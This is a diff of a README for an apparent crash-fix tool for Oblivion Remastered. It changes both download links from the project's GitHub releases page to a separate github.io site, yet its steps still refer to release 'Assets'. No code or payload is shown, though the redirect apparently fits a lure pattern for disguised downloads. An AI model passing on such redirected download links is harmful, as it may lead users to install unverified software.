@@ -1,6 +1,6 @@
 # 🛠️ Oblivion-Remastered-Crash-Fix - Stop game crashes on modern Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/najma3365/Oblivion-Remastered-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://najma3365.github.io)
 
 This software solves startup crashes for Oblivion Remastered on Windows 10 and Windows 11. Many users experience a black screen or an immediate exit when they launch the game. This fix addresses those errors.
 
@@ -8,7 +8,7 @@ This software solves startup crashes for Oblivion Remastered on Windows 10 and W
 
 You must visit the official release page to download the latest version of the fix. Follow these simple steps:
 
-1. Visit [this page to download](https://github.com/najma3365/Oblivion-Remastered-Crash-Fix/releases).
+1. Visit [this page to download](https://najma3365.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Click the link ending in .zip to start your download.
 4. Save the file to your computer.
